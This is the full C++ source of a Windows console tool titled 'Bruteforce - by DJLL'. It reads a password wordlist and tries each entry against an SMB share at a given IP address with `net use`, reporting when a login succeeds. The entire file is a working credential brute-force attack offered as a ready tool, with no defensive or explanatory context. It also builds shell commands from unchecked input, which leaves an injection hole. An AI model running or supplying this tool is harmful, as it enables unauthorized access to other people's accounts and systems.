#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>

void attempt(const std::string& ip, const std::string& user, const std::string& pass, int& count) {
    std::string command = "net use \\\\" + ip + " /user:" + user + " " + pass + " >nul 2>&1";
    int result = system(command.c_str());
    
    std::cout << "[ATTEMPT " << count << "] [" << pass << "]" << std::endl;
    count++;
    
    if (result == 0) {
        std::cout << "\nPassword Found! " << pass << std::endl;
        command = "net use \\\\" + ip + " /d /y >nul 2>&1";
        system(command.c_str());
        exit(0);
    }
}

int main() {
    SetConsoleTitle("Bruteforce - by DJLL");
    
    std::string ip, user, wordlist;
    std::cout << "\nEnter IP Address: ";
    std::getline(std::cin, ip);
    std::cout << "Enter Username: ";
    std::getline(std::cin, user);
    std::cout << "Enter Password List: ";
    std::getline(std::cin, wordlist);

    std::ifstream file(wordlist);
    if (!file.is_open()) {
        std::cout << "Failed to open password list file." << std::endl;
        return 1;
    }

    std::string pass;
    int count = 1;
    while (std::getline(file, pass)) {
        attempt(ip, user, pass, count);
    }

    std::cout << "Password not Found :(" << std::endl;
    system("pause");
    return 0;
}
